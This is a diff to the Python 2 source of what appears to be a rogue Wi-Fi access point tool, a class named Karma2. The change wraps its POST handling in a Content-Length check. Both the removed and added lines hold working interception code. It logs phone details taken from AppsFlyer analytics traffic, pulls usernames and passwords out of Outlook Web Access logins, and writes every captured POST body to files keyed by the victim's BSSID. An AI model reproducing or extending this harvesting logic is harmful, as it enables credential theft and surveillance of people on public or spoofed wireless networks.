@@ -369,36 +369,37 @@ class Karma2:
         pass
       
       # get content
-      length = int(self.headers['Content-Length'])
-      post = self.rfile.read(length)
+      if self.headers.has_key('Content-Length'):
+        length = int(self.headers['Content-Length'])
+        post = self.rfile.read(length)
 
-      if host == 't.appsflyer.com' and path == 'api/v2.3/androidevent':
-        model = self.headers.get('model')
-        lang = self.headers.get('lang')
-        operator = self.headers.get('operator')
-        brand = self.headers.get('brand')
-        country = self.headers.get('country')
-        log( "%s is using a %s %s using %s. Language is %s"%(client, brand, model, operator, lang))
+        if host == 't.appsflyer.com' and path == 'api/v2.3/androidevent':
+          model = self.headers.get('model')
+          lang = self.headers.get('lang')
+          operator = self.headers.get('operator')
+          brand = self.headers.get('brand')
+          country = self.headers.get('country')
+          log( "%s is using a %s %s using %s. Language is %s"%(client, brand, model, operator, lang))
 
-      elif path == 'owa/auth.owa':
-        
-        try:
-          kvs = dict([ kv.split('=') for kv in urllib2.unquote(post).split('&')])
-          log( "%s login is %s"%(fullpath, 
-            _ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
-          user = {'login':{'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}}
-          self.server.app.update_login(user)
-        except:
-          raise
-            
-      #save content
-      if length > 0:
-        bssid = self.server.app.get_client_bssid(client)
-        name = "%s_%s_%d"%(bssid,host,time.time())
-        f = open(name,'w')
-        f.write(post)
-        f.close()
-        log( "[+] %s from %s to %s (%s)"%(_ctxt("saved post request",GREEN), client, fullpath, name))
+        elif path == 'owa/auth.owa':
+          
+          try:
+            kvs = dict([ kv.split('=') for kv in urllib2.unquote(post).split('&')])
+            log( "%s login is %s"%(fullpath, 
+              _ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
+            user = {'login':{'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}}
+            self.server.app.update_login(user)
+          except:
+            raise
+              
+        #save content
+        if length > 0:
+          bssid = self.server.app.get_client_bssid(client)
+          name = "%s_%s_%d"%(bssid,host,time.time())
+          f = open(name,'w')
+          f.write(post)
+          f.close()
+          log( "[+] %s from %s to %s (%s)"%(_ctxt("saved post request",GREEN), client, fullpath, name))
       
       self.send_response(200)
       self.end_headers()
